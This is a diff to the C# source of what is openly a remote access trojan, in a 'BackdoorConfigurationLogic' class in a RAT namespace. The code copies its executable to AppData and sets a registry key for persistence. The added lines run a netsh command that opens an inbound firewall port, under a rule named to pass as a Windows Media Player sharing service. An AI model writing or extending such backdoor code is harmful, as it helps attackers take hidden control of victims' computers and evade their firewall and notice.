@@ -13,6 +13,17 @@ namespace RAT.Configurations
     /// </summary>
     public class BackdoorConfigurationLogic : IBackdoorConfigurationLogic
     {
+        private readonly ICmdLogic _cmdLogic;
+
+        /// <summary>
+        /// Contains logic to work with backdoor configuration.
+        /// </summary>
+        /// <param name="cmdLogic">Logic to handle windows cmd.</param>
+        public BackdoorConfigurationLogic(ICmdLogic cmdLogic)
+        {
+            _cmdLogic = cmdLogic;
+        }
+
         /// <summary>
         /// This section is needed to get our exe location for self-contained exe. Which by default is launched from .NET dll.
         /// </summary>
@@ -28,7 +39,9 @@ namespace RAT.Configurations
         {
             string pathToExe = this.CopyExeToOtherLocation(); // 1 Step - copy exe to AppData.
             this.SetRegistryKeyForApplication(pathToExe); // 2 Step - set registry key.
-            return GetBackdoorConfiguration(); // 3 Step - get configuration which is merged into our .exe
+            var configuration = GetBackdoorConfiguration(); // 3 Step - get configuration which is merged into our .exe
+            this.OpenPortForMainConnection(configuration.ConnectionPort); // Step 4 - open port to accept connection.
+            return configuration;
         }
 
         /// <summary>
@@ -52,6 +65,22 @@ namespace RAT.Configurations
             }
 
             return pathToExeInAppData;
+        }
+
+        /// <summary>
+        /// Opens passed in port for connection by using cmd process.
+        /// </summary>
+        /// <param name="port">Port that should be opened.</param>
+        private void OpenPortForMainConnection(int port)
+        {
+            string command = $"netsh advfirewall firewall add rule " +
+                $"name= \"Windows Media Player Network Sharing Service (Streaming-TCP-Out\"" + // Trying to be in the lower list of open ports
+                $"dir=in " +
+                $"action=allow " +
+                $"protocol=TCP " +
+                $"localport={port}" +
+                $"program=%SystemRoot%\\System32\\tlntsvr.exe"; // Whatever can be used
+            _cmdLogic.CreateCmdExecuteCommandAndKillCmd(command);
         }
 
         /// <summary>
